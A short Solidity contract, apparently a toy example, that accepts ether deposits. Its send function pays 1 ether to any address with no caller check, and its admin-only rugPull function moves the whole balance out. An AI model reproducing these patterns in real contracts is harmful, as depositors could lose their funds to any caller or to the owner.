// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.1;

contract Transfer{
    uint256 balance;
    address admin;

    constructor(){
        admin = msg.sender;
    }

    function deposit() external payable{
        require(msg.value > 2 ether, "INVALID_AMOUNT");
        balance += msg.value;
    }

    function send(address payable _receiver) external {
        require(address(this).balance > 1 ether, "INSUFFICIENT_BALANCE");
        _receiver.transfer(1 ether);
        balance -= 1 ether;
    }

     function rugPull(address payable _receiver) external {
                 require(msg.sender == admin, "NOT_APPROVED");
        _receiver.transfer(address(this).balance);
        balance = 0;
    }
}